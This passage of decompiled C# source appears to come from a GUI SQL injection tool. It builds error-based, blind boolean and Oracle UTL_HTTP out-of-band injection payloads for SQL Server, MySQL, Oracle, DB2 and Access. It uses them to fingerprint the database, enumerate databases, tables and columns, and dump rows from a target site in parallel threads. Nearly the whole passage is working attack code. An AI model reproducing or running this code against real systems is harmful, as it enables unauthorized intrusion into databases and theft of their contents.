		string value = regex.Match(input).Value;
		if (!string.IsNullOrEmpty(value))
		{
			return value;
		}
		text = string_0 + string_1 + "%20and%20ctxsys.drithsx.sn(1,(chr(33)||chr(83)||chr(33)||(" + string_8 + ")||chr(33)||chr(69)||chr(33)))=1" + string_3;
		input = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
		return regex.Match(input).Value;
	}

	private string method_22(string string_8, int int_1)
	{
		while (formMain_0.gclass0_0.method_12() > 1)
		{
			Thread.Sleep(500);
		}
		if (int_1 <= 62)
		{
			string text = string_0 + string_1 + "%20and%20(1,1)>(select%20count(*),concat((" + string_8 + "),0x3a,floor(rand()*2))%20x%20from%20(select%201%20union%20select%202)%20a%20group%20by%20x%20limit%201)" + string_3;
			string text2 = "";
			string text3 = "";
			Regex regex = new Regex("(?<=\\')[^\\']+(?=:[01]\\')", RegexOptions.Multiline | RegexOptions.Singleline);
			int num = 0;
			while (true)
			{
				if (num < 16)
				{
					text2 = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
					text3 = regex.Match(text2).Value;
					if (!string.IsNullOrEmpty(text3))
					{
						break;
					}
					num++;
					continue;
				}
				return text3;
			}
			return text3;
		}
		int num2 = 1;
		int num3 = int_1;
		string text4 = "";
		while (num3 > 0)
		{
			string text5 = "";
			if (num3 <= 62)
			{
				text5 = "substr((" + string_8 + ")," + num2 + ")";
				num3 = 0;
			}
			else
			{
				text5 = "substr((" + string_8 + ")," + num2 + ",62)";
				num2 += 62;
				num3 -= 62;
			}
			text4 += method_22(text5, 62);
		}
		return text4;
	}

	private void method_23(string string_8)
	{
		bool_0 = true;
		try
		{
			formMain_0.method_11("Getting Blind Injection Type...");
			if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
			{
				formMain_0.gclass0_0.method_17(method_13(string_8));
			}
			if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
			{
				string value = method_14("@@version");
				if (!string.IsNullOrEmpty(value))
				{
					formMain_0.gclass0_0.method_21(GEnum3.PlainText);
					return;
				}
				if (formMain_0.gclass0_0.int_4 == 0)
				{
					formMain_0.gclass0_0.int_4 = method_19(string_8);
				}
				if (formMain_0.gclass0_0.int_4 >= 0)
				{
					int num = method_20(formMain_0.gclass0_0.int_4);
					if (num >= 0)
					{
						formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
						formMain_0.gclass0_0.int_3 = num;
						return;
					}
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
			{
				if (formMain_0.gclass0_0.int_4 == 0)
				{
					formMain_0.gclass0_0.int_4 = method_19(string_8);
				}
				if (formMain_0.gclass0_0.int_4 > 0)
				{
					int num2 = method_20(formMain_0.gclass0_0.int_4);
					if (num2 > 0)
					{
						formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
						formMain_0.gclass0_0.int_3 = num2;
						return;
					}
				}
				string text = method_22(method_37("!S!WWWCCCRRR1.0!E!"), 32);
				if (text.Equals("!S!WWWCCCRRR1.0!E!"))
				{
					formMain_0.gclass0_0.method_21(GEnum3.PlainText);
					return;
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
			{
				string text2 = method_21(method_37("WWWCCCRRR1.0"));
				if (text2.Equals("WWWCCCRRR1.0"))
				{
					formMain_0.gclass0_0.method_21(GEnum3.PlainText);
					return;
				}
				if (formMain_0.gclass0_0.int_4 == 0)
				{
					formMain_0.gclass0_0.int_4 = method_19(string_8);
				}
				if (formMain_0.gclass0_0.int_4 > 0)
				{
					int num3 = method_20(formMain_0.gclass0_0.int_4);
					if (num3 > 0)
					{
						formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
						formMain_0.gclass0_0.int_3 = num3;
						return;
					}
				}
				string text3 = string_8 + string_1 + "%20and%20UTL_HTTP.request(" + method_37(WCRSetting.string_0 + formMain_0.gclass0_0.method_11()) + ")=1" + string_3;
				formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
				text2 = formMain_0.gclass0_0.method_31(WCRSetting.string_1, GEnum0.GET, Encoding.UTF8);
				if (text2.Equals(formMain_0.gclass0_0.method_11()))
				{
					formMain_0.gclass0_0.method_21(GEnum3.CrossSite);
					return;
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
			{
				if (formMain_0.gclass0_0.int_4 == 0)
				{
					formMain_0.gclass0_0.int_4 = method_19(string_8);
				}
				if (formMain_0.gclass0_0.int_4 > 0)
				{
					int num4 = method_20(formMain_0.gclass0_0.int_4);
					if (num4 > 0)
					{
						formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
						formMain_0.gclass0_0.int_3 = num4;
						return;
					}
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
			{
				while (formMain_0.gclass0_0.method_12() > 0)
				{
					Thread.Sleep(500);
				}
				if (formMain_0.gclass0_0.int_4 == 0)
				{
					formMain_0.gclass0_0.int_4 = method_19(string_8);
				}
				if (formMain_0.gclass0_0.int_4 >= 0)
				{
					int num5 = method_20(formMain_0.gclass0_0.int_4);
					if (num5 >= 0)
					{
						formMain_0.gclass0_0.method_21(GEnum3.FieldEcho);
						formMain_0.gclass0_0.int_3 = num5;
						return;
					}
				}
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				formMain_0.gclass0_0.method_21(GEnum3.Blind);
			}
		}
		catch
		{
		}
		finally
		{
			bool_0 = false;
		}
	}

	private string method_24(string string_8)
	{
		try
		{
			if (!((Control)treeViewDB).get_InvokeRequired())
			{
				string[] array = string_8.Split(new char[1] { '^' });
				switch (array.Length - 1)
				{
				case 0:
				{
					int num6 = int.Parse(array[0]);
					return treeViewDB.get_Nodes().get_Item(num6).get_Text();
				}
				case 1:
				{
					int num4 = int.Parse(array[0]);
					int num5 = int.Parse(array[1]);
					return treeViewDB.get_Nodes().get_Item(num4).get_Nodes()
						.get_Item(num5)
						.get_Text();
				}
				case 2:
				{
					int num = int.Parse(array[0]);
					int num2 = int.Parse(array[1]);
					int num3 = int.Parse(array[2]);
					return treeViewDB.get_Nodes().get_Item(num).get_Nodes()
						.get_Item(num2)
						.get_Nodes()
						.get_Item(num3)
						.get_Text();
				}
				default:
					return "";
				}
			}
			Delegate14 @delegate = method_24;
			return (string)((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
		catch
		{
			return "";
		}
	}

	private string method_25()
	{
		if (string.IsNullOrEmpty(string_5))
		{
			string text = method_24("0|0");
			if (string.IsNullOrEmpty(text))
			{
				return "NULL";
			}
			return text;
		}
		return string_5;
	}

	private int method_26(string string_8, string string_9, string string_10, int int_1, int int_2)
	{
		if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
		{
			string text = "";
			text = method_15(string_8, "cstr(" + string_9 + ")", string_10, bool_1: false);
			if (!string.IsNullOrEmpty(text) && Regex.IsMatch(text, "^\\d+$"))
			{
				int num = int.Parse(text);
				if (num >= 0)
				{
					return num;
				}
			}
		}
		formMain_0.gclass0_0.method_4(method_6(string_0));
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
		{
			return -1;
		}
		string text2 = "";
		string text3 = "";
		int result = -1;
		string text4 = string_8 + " " + string_9 + " " + string_10;
		text2 = string_0 + string_1 + " and (" + text4 + ")>" + int_1 + string_2;
		text3 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
		if (string.IsNullOrEmpty(text3))
		{
			return -1;
		}
		if (text3.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
		{
			result = -1;
			return -1;
		}
		do
		{
			text2 = string_0 + string_1 + " and (" + text4 + ")=" + (int_1 + int_2) / 2 + string_2;
			text3 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
			if (string.IsNullOrEmpty(text3))
			{
				text3 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
			}
			if (!string.IsNullOrEmpty(text3))
			{
				if (text3.IndexOf(formMain_0.gclass0_0.method_3()) < 0)
				{
					text2 = string_0 + string_1 + " and (" + text4 + ")<" + (int_1 + int_2) / 2 + string_2;
					text3 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
					if (!string.IsNullOrEmpty(text3))
					{
						if (text3.IndexOf(formMain_0.gclass0_0.method_3()) < 0)
						{
							int_2 = ((int_2 != (int_1 + int_2) / 2) ? ((int_1 + int_2) / 2 + 1) : (int_2 + 1));
						}
						else
						{
							int_1 = (int_1 + int_2) / 2 - 1;
						}
						continue;
					}
					return -1;
				}
				return (int_1 + int_2) / 2;
			}
			return -1;
		}
		while (int_2 <= int_1);
		return result;
	}

	private int method_27(string string_8, int int_1, int int_2)
	{
		if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
		{
			method_23(string_0);
		}
		if (formMain_0.gclass0_0.method_20() == GEnum3.PlainText)
		{
			if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
			{
				string s = method_14("cast((" + string_8 + ")%20as%20varchar(8))");
				try
				{
					int num = int.Parse(s);
					if (num >= 0)
					{
						return num;
					}
				}
				catch
				{
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
			{
				string s2 = method_22("cast((" + string_8 + ")%20as%20char)", 32);
				try
				{
					int num2 = int.Parse(s2);
					if (num2 >= 0)
					{
						return num2;
					}
				}
				catch
				{
				}
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
			{
				string s3 = method_21(string_8);
				try
				{
					int num3 = int.Parse(s3);
					if (num3 >= 0)
					{
						return num3;
					}
				}
				catch
				{
				}
			}
		}
		else if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
		{
			string s4 = "";
			if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
			{
				s4 = method_15("select", "cast((" + string_8 + ")%20as%20varchar(8))", "", bool_1: false);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
			{
				s4 = method_15("select", "cast((" + string_8 + ")%20as%20char)", "", bool_1: false);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
			{
				s4 = method_15("select", "NVL(cast((" + string_8 + ")%20as%20varchar(64)),chr(32))", "from dual", bool_1: false);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
			{
				s4 = method_15("select", "coalesce(rtrim(cast((" + string_8 + ")%20as%20char(250))),chr(32))", "from sysibm.sysdummy1", bool_1: false);
			}
			else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
			{
				s4 = method_15("select", "cstr(" + string_8 + ")", "from " + string_5, bool_1: false);
			}
			try
			{
				int num4 = int.Parse(s4);
				if (num4 >= 0)
				{
					return num4;
				}
			}
			catch
			{
			}
		}
		else if (formMain_0.gclass0_0.method_20() == GEnum3.CrossSite && formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			string s5 = method_16("select", "NVL(cast((" + string_8 + ")%20as%20varchar(64)),chr(32))", "from dual");
			try
			{
				int num5 = int.Parse(s5);
				if (num5 >= 0)
				{
					return num5;
				}
			}
			catch
			{
			}
		}
		formMain_0.gclass0_0.method_4(method_6(string_0));
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
		{
			return -1;
		}
		string text = "";
		string text2 = "";
		int result = -1;
		text = string_0 + string_1 + " and (" + string_8 + ")>" + int_1 + string_2;
		text2 = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
		if (string.IsNullOrEmpty(text2))
		{
			return -1;
		}
		if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
		{
			result = -1;
			return -1;
		}
		do
		{
			text = string_0 + string_1 + " and (" + string_8 + ")=" + (int_1 + int_2) / 2 + string_2;
			text2 = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
			if (string.IsNullOrEmpty(text2))
			{
				text2 = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
			}
			if (!string.IsNullOrEmpty(text2))
			{
				if (text2.IndexOf(formMain_0.gclass0_0.method_3()) < 0)
				{
					text = string_0 + string_1 + " and (" + string_8 + ")<" + (int_1 + int_2) / 2 + string_2;
					text2 = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
					if (!string.IsNullOrEmpty(text2))
					{
						if (text2.IndexOf(formMain_0.gclass0_0.method_3()) < 0)
						{
							int_2 = ((int_2 != (int_1 + int_2) / 2) ? ((int_1 + int_2) / 2 + 1) : (int_2 + 1));
						}
						else
						{
							int_1 = (int_1 + int_2) / 2 - 1;
						}
						continue;
					}
					return -1;
				}
				return (int_1 + int_2) / 2;
			}
			return -1;
		}
		while (int_2 <= int_1);
		formMain_0.method_11("Get Int: " + result);
		return result;
	}

	private string method_28(string string_8, string string_9, string string_10, int int_1, int int_2, bool bool_1)
	{
		string text = "";
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.PlainText)
			{
				string text2 = string_0 + string_1 + "%20and%20(char(33)%2Bchar(83)%2Bchar(33)%2B(" + string_8 + "%20" + string_9 + "%20" + string_10 + ")%2Bchar(33)%2Bchar(69)%2Bchar(33))>0" + string_2;
				Regex regex = new Regex("(?<=(!S!))[.\\s\\S]*?(?=(!E!))", RegexOptions.Multiline | RegexOptions.Singleline);
				text = regex.Match(formMain_0.gclass0_0.method_30(text2, formMain_0.method_0())).Value;
				formMain_0.method_11("Get : " + text);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			else if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text = method_15(string_8, string_9, string_10, bool_1);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_0));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return "";
			}
			int num = method_27(string_8 + "%20len(" + string_9 + ")%20" + string_10, int_2, 0);
			formMain_0.method_11("Get Length: " + num);
			if (num < 1)
			{
				return "";
			}
			for (int i = 0; i < num; i++)
			{
				int num2 = method_27(string_8 + "%20ASCII(SUBSTRING(" + string_9 + "," + (i + 1) + ",1))%20" + string_10, int_1, 0);
				char c = (char)num2;
				text = ((c <= '\u007f') ? (text + c) : (text + (char)method_27(string_8 + "%20UNICODE(SUBSTRING(" + string_9 + "," + (i + 1) + ",1))%20" + string_10, 65535, 128)));
				formMain_0.method_11("Get " + text.Length + "/" + num + " :  " + text);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_29()
	{
		formMain_0.method_11("Getting DB ...");
		if (cmbChkAllDB.get_SelectedIndex() == 0)
		{
			string text = method_28("", "db_name()", "", 255, 128, bool_1: false);
			if (!string.IsNullOrEmpty(text))
			{
				method_11(text);
				string_6 = text;
			}
			formMain_0.method_11("Done");
			return;
		}
		int num = method_27("select%20count(1)%20from%20[master]..[sysdatabases]", 128, 0);
		formMain_0.method_11("Get DB Num: " + num);
		if (num < 1)
		{
			formMain_0.method_11("Done");
			return;
		}
		for (int i = 0; i < num; i++)
		{
			ThreadPool.QueueUserWorkItem(method_30, i + 1);
		}
	}

	private void method_30(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string string_ = method_28("select", "name", "from%20[master]..[sysdatabases]%20where dbid=" + (int)object_0, 255, 128, bool_1: false);
			method_11(string_);
		}
		catch
		{
		}
	}

	private int method_31(string string_8)
	{
		try
		{
			if (!((Control)treeViewDB).get_InvokeRequired())
			{
				if (string.IsNullOrEmpty(string_8))
				{
					return treeViewDB.get_Nodes().get_Count();
				}
				string[] array = string_8.Split(new char[1] { '^' });
				switch (array.Length - 1)
				{
				case 0:
				{
					int num3 = int.Parse(array[0]);
					return treeViewDB.get_Nodes().get_Item(num3).get_Nodes()
						.get_Count();
				}
				case 1:
				{
					int num = int.Parse(array[0]);
					int num2 = int.Parse(array[1]);
					return treeViewDB.get_Nodes().get_Item(num).get_Nodes()
						.get_Item(num2)
						.get_Nodes()
						.get_Count();
				}
				default:
					return 0;
				}
			}
			Delegate15 @delegate = method_31;
			return (int)((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
		catch
		{
			return 0;
		}
	}

	private bool method_32(string string_8)
	{
		if (!((Control)treeViewDB).get_InvokeRequired())
		{
			string[] array = string_8.Split(new char[1] { '^' });
			switch (array.Length - 1)
			{
			case 0:
			{
				int num6 = int.Parse(array[0]);
				return treeViewDB.get_Nodes().get_Item(num6).get_Checked();
			}
			case 1:
			{
				int num4 = int.Parse(array[0]);
				int num5 = int.Parse(array[1]);
				return treeViewDB.get_Nodes().get_Item(num4).get_Nodes()
					.get_Item(num5)
					.get_Checked();
			}
			case 2:
			{
				int num = int.Parse(array[0]);
				int num2 = int.Parse(array[1]);
				int num3 = int.Parse(array[2]);
				return treeViewDB.get_Nodes().get_Item(num).get_Nodes()
					.get_Item(num2)
					.get_Nodes()
					.get_Item(num3)
					.get_Checked();
			}
			default:
				return false;
			}
		}
		Delegate16 @delegate = method_32;
		return (bool)((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
	}

	private void method_33(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			formMain_0.method_11("Getting Tables ...");
			_ = DateTime.Now;
			string text = "";
			int num = method_31("");
			int num2 = 0;
			while (true)
			{
				if (num2 < num)
				{
					if (GClass0.genum4_0 == GEnum4.Stop)
					{
						Thread.CurrentThread.Abort();
					}
					if (method_32(num2.ToString()))
					{
						break;
					}
					num2++;
					continue;
				}
				return;
			}
			text = method_24(num2.ToString());
			int num3 = method_27("select count(1) from [" + text + "]..[sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500", 256, 0);
			if (num3 < 0)
			{
				num3 = method_27("select count(1) from [sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500", 256, 0);
			}
			formMain_0.method_11("Get Table Num: " + num3);
			if (num3 < 0)
			{
				num3 = 256;
			}
			string[] array = new string[num3];
			for (int i = 0; i < num3; i++)
			{
				array[i] = num2 + "^" + (i + 1) + "^" + text;
				ThreadPool.QueueUserWorkItem(method_36, array[i]);
			}
		}
		catch
		{
		}
	}

	private void method_34(string string_8)
	{
		int num = int.Parse(string_8.Split(new char[1] { '^' })[0]);
		string text = string_8.Split(new char[1] { '^' })[1];
		if (!string.IsNullOrEmpty(text))
		{
			if (!((Control)treeViewDB).get_InvokeRequired())
			{
				TreeNode val = treeViewDB.get_Nodes().get_Item(num).get_Nodes()
					.Add(text);
				val.set_ImageKey("table.png");
				treeViewDB.ExpandAll();
				((Control)treeViewDB).Refresh();
			}
			else
			{
				Delegate10 @delegate = method_34;
				((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
			}
		}
	}

	private void method_35(string string_8)
	{
		if (!((Control)treeViewDB).get_InvokeRequired())
		{
			string[] array = string_8.Split(new char[1] { '^' });
			int num = int.Parse(array[0]);
			int num2 = int.Parse(array[1]);
			string text = array[2];
			if (!string.IsNullOrEmpty(text))
			{
				TreeNode val = treeViewDB.get_Nodes().get_Item(num).get_Nodes()
					.get_Item(num2)
					.get_Nodes()
					.Add(text);
				val.set_ImageKey("column.png");
				treeViewDB.ExpandAll();
				((Control)treeViewDB).Refresh();
			}
		}
		else
		{
			Delegate10 @delegate = method_35;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
	}

	private void method_36(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[1];
			string text3 = array[2];
			string text4 = method_28("select%20top%201%20", "name", " from(Select top " + text2 + " id,name from [" + text3 + "]..[sysobjects] where xtype=0x55  and name not like 0x570043005200540045004D0050002500 order by id) T order by id desc", 255, 128, bool_1: true);
			method_34(array[0] + "^" + text4);
		}
		catch
		{
		}
	}

	private string method_37(string string_8)
	{
		if (string.IsNullOrEmpty(string_8))
		{
			return "";
		}
		char[] array = string_8.ToCharArray();
		byte[] bytes = Encoding.Default.GetBytes(string_8);
		string text = "";
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			text += "0x";
			byte b = 0;
			byte b2 = 0;
			for (int i = 0; i < array.Length; i++)
			{
				b2 = (byte)(array[i] & 0xFFu);
				b = (byte)((int)array[i] >> 8);
				text += $"{b2:X2}{b:X2}";
			}
			return text;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			for (int j = 0; j < bytes.Length; j++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += ",";
				}
				text += $"{(int)bytes[j]:D}";
			}
			return "char(" + text + ")";
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			for (int k = 0; k < array.Length; k++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += "||";
				}
				text = text + "chr(" + $"{method_69(array[k]):D}" + ")";
			}
			return text;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			for (int l = 0; l < bytes.Length; l++)
			{
				if (!string.IsNullOrEmpty(text))
				{
					text += "||";
				}
				text = text + "chr(" + $"{(int)bytes[l]:D}" + ")";
			}
			return text;
		}
		return string_8;
	}

	private void method_38(object object_0)
	{
		string text = "";
		string text2 = "";
		int num = method_31("");
		for (int i = 0; i < num; i++)
		{
			if (!method_32(i.ToString()))
			{
				continue;
			}
			text = method_24(i.ToString());
			int num2 = method_31(i.ToString());
			for (int j = 0; j < num2; j++)
			{
				if (!method_32(i + "^" + j))
				{
					continue;
				}
				formMain_0.method_11("Getting Columns ...");
				string text3 = "";
				text2 = method_24(i + "^" + j);
				int num3 = method_27("select count(1) from [" + text + "].information_schema.columns where table_name=" + method_37(text2), 128, 0);
				formMain_0.method_11("Get Column Num: " + num3);
				if (num3 < 1)
				{
					if (text.Equals(string_6))
					{
						int num4 = 1;
						while (true)
						{
							string text4 = method_28("select", "col_name(object_id(" + method_37(text2) + ")," + num4 + ")", "", 255, 128, bool_1: false);
							if (!string.IsNullOrEmpty(text4))
							{
								method_35(i + "^" + j + "^" + text4);
								num4++;
								continue;
							}
							break;
						}
						return;
					}
					num3 = 128;
				}
				for (int k = 0; k < num3; k++)
				{
					text3 = i + "^" + j + "^" + (k + 1) + "^" + text + "^" + text2;
					ThreadPool.QueueUserWorkItem(method_39, text3);
				}
				break;
			}
		}
	}

	private void method_39(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string text = (string)object_0;
			string[] array = text.Split(new char[1] { '^' });
			string text2 = array[0];
			string text3 = array[1];
			string text4 = array[2];
			string text5 = array[3];
			string string_ = array[4];
			string text6 = method_28("select%20top%201%20", "column_name", " from [" + text5 + "].information_schema.columns where table_name=" + method_37(string_) + "%20and ordinal_position=" + text4, 255, 128, bool_1: false);
			method_35(text2 + "^" + text3 + "^" + text6);
		}
		catch
		{
		}
	}

	private void method_40(int int_1, int int_2)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		//IL_0062: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_00b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_01a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e1: Unknown result type (might be due to invalid IL or missing references)
		string text = "";
		string text2 = "";
		foreach (TreeNode node in treeViewDB.get_Nodes())
		{
			TreeNode val = node;
			if (!val.get_Checked())
			{
				continue;
			}
			text = val.get_Text();
			{
				foreach (TreeNode node2 in val.get_Nodes())
				{
					TreeNode val2 = node2;
					if (!val2.get_Checked())
					{
						continue;
					}
					text2 = val2.get_Text();
					string text3 = "";
					string text4 = "";
					string text5 = "";
					foreach (TreeNode node3 in val2.get_Nodes())
					{
						TreeNode val3 = node3;
						if (val3.get_Checked())
						{
							if (string.IsNullOrEmpty(text3))
							{
								text5 = "[" + val3.get_Text() + "]";
							}
							else
							{
								text3 += "%2Bchar(94)%2B";
								text4 += ",";
							}
							text3 = text3 + "isnull(cast([" + val3.get_Text() + "] as nvarchar(4000)),char(32))";
							text4 = text4 + "[" + val3.get_Text() + "]";
						}
					}
					int num = method_27("select count(1) from [" + text + "]..[" + text2 + "]", int_2, 0);
					if (num == 0)
					{
						MessageBox.Show("No Records Found!");
						break;
					}
					if (num > 0 && num < int_2)
					{
						int_2 = num;
						((ToolStripItem)txtRowsEnd).set_Text(num.ToString());
					}
					if (int_1 > int_2)
					{
						MessageBox.Show("* Exceed Records Range!\r\n* The Rows Num=" + num);
						break;
					}
					for (int i = int_1 - 1; i < int_2; i++)
					{
						string text6 = "";
						ThreadPool.QueueUserWorkItem(state: (!text.Equals(string_6)) ? (text3 + "^" + i + "^" + text4 + "^[" + text + "]..[" + text2 + "]^" + text5) : (text3 + "^" + i + "^" + text4 + "^[" + text2 + "]^" + text5), callBack: method_42);
					}
					break;
				}
				break;
			}
		}
	}

	private void method_41(string string_8)
	{
		if (!((Control)listViewData).get_InvokeRequired())
		{
			string[] array = string_8.Split(new char[1] { '^' });
			ListViewItem val = listViewData.get_Items().Add(array[0]);
			try
			{
				for (int i = 1; i < listViewData.get_Columns().get_Count(); i++)
				{
					val.get_SubItems().Add(array[i]);
				}
				((Control)listViewData).Refresh();
				return;
			}
			catch
			{
				return;
			}
		}
		Delegate10 @delegate = method_41;
		((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
	}

	private void method_42(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			string[] array = ((string)object_0).Split(new char[1] { '^' });
			string string_ = array[0];
			int num = int.Parse(array[1]);
			string text = array[2];
			string text2 = array[3];
			string text3 = array[4];
			string string_2 = method_28("select%20top%201%20", string_, "from (select top " + (num + 1) + " " + text + " from " + text2 + " order by " + text3 + ") T order by " + text3 + " desc", 255, 1024, bool_1: true);
			method_41(string_2);
		}
		catch
		{
		}
	}

	private string method_43(string string_8, string string_9, string string_10, int int_1, int int_2)
	{
		string text = "";
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (formMain_0.gclass0_0.method_20() == GEnum3.FieldEcho)
			{
				text = method_15(string_8, string_9, string_10, bool_1: false);
				if (!string.IsNullOrEmpty(text))
				{
					return text;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_0));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return "";
			}
			int num = method_27(string_8 + "%20len(" + string_9 + ")%20" + string_10, int_2, 0);
			formMain_0.method_11("Get Length: " + num);
			if (num < 1)
			{
				return "";
			}
			for (int i = 0; i < num; i++)
			{
				char c = (char)method_27(string_8 + "%20ASC(MID(" + string_9 + "," + (i + 1) + ",1))%20" + string_10, int_1, 0);
				text += c;
				formMain_0.method_11("Get " + text.Length + "/" + num + " :  " + text);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private int method_44(ListView listView_0)
	{
		if (!((Control)listView_0).get_InvokeRequired())
		{
			return listView_0.get_Items().get_Count();
		}
		Delegate17 @delegate = method_44;
		return (int)((Control)this).Invoke((Delegate)@delegate, new object[1] { listView_0 });
	}

	private bool method_45(int int_1)
	{
		if (!((Control)listViewEnv).get_InvokeRequired())
		{
			if (listViewEnv.get_Items().get_Item(int_1).get_Checked())
			{
				return true;
			}
			return false;
		}
		Delegate18 @delegate = method_45;
		return (bool)((Control)this).Invoke((Delegate)@delegate, new object[1] { int_1 });
	}

	private string method_46(int int_1)
	{
		if (!((Control)listViewEnv).get_InvokeRequired())
		{
			return listViewEnv.get_Items().get_Item(int_1).get_Text();
		}
		Delegate19 @delegate = method_46;
		return (string)((Control)this).Invoke((Delegate)@delegate, new object[1] { int_1 });
	}

	private string method_47(string string_8)
	{
		try
		{
			HttpWebResponse httpWebResponse = formMain_0.gclass0_0.method_28(string_8, formMain_0.method_0());
			return httpWebResponse.Server.ToString();
		}
		catch
		{
			return "";
		}
	}

	private void method_48(string string_8)
	{
		if (!((Control)listViewEnv).get_InvokeRequired())
		{
			string[] array = string_8.Split(new char[1] { '^' });
			int num = int.Parse(array[0]);
			string text = array[1];
			if (listViewEnv.get_Items().get_Item(num).get_SubItems()
				.get_Count() > 1)
			{
				listViewEnv.get_Items().get_Item(num).get_SubItems()
					.RemoveAt(1);
			}
			listViewEnv.get_Items().get_Item(num).get_SubItems()
				.Add(text);
			((Control)listViewEnv).Refresh();
		}
		else
		{
			Delegate10 @delegate = method_48;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
	}

	private void method_49(object object_0)
	{
		formMain_0.method_11("Auto Checking ...");
		int num = method_44(listViewEnv);
		for (int i = 0; i < num; i++)
		{
			if (!method_45(i))
			{
				continue;
			}
			string text = method_46(i);
			if (formMain_0.gclass0_0.method_20() == GEnum3.UnKnown)
			{
				method_23(string_0);
			}
			if (text.Equals("Server"))
			{
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = method_47(string_0);
				}
				if (string.IsNullOrEmpty(string_7))
				{
					string_7 = "NULL";
				}
				method_48(i + "^" + string_7);
			}
		}
	}

	private void method_50(object object_0)
	{
		try
		{
			if (GClass0.genum4_0 == GEnum4.Stop)
			{
				Thread.CurrentThread.Abort();
			}
